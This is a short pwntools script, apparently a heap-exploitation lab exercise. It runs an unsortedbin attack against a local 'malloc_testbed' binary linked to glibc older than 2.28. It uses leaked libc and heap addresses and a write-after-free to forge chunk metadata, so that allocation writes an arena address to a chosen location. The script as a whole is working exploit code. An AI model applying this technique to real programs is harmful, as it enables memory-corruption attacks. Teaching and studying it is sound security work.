#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("malloc_testbed")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Return chunk index.
def malloc(size):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

# Select the "free address" option; send address.
def free_address(address):
    io.send("3")
    io.sendafter("address: ", f"{address}")
    io.recvuntil("> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("4")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "read" option; send index.
# Return data from read operation.
def read(index):
    io.send("5")
    io.sendafter("index: ", f"{index}")
    r = io.recvuntil("\n1) malloc", drop=True)
    io.recvuntil("> ")
    return r

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)

# This binary leaks the address of its m_array.
io.recvuntil("m_array @ ")
m_array = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# Ensure the malloc testbed is linked against GLIBC version < 2.28 before running this script.
# An unsortedbin attack mitigation was introduced in GLIBC version 2.28.

# Request 2 chunks.
chunk_A = malloc(0x88) # 0x90 chunk, will be freed into the unsortedbin.
chunk_B = malloc(0x18) # Guard against consolidation with the top chunk.

# Free chunk A to the unsorted bin 
free(chunk_A)

# Partial unlink ignores chunk's fd
fd = p64(0xdeadbeef)
bk = p64(heap - 16)

# Leverage the write-after-free bug to overwrite unsortedbin metadata.
edit(chunk_A, fd + bk)

# Allocate chunk A, subjecting it to a partial unlink.
# Our forged bk is followed and the address of the main arena's unsortedbin is written to the target.
malloc(0x88)

# =============================================================================

io.interactive()
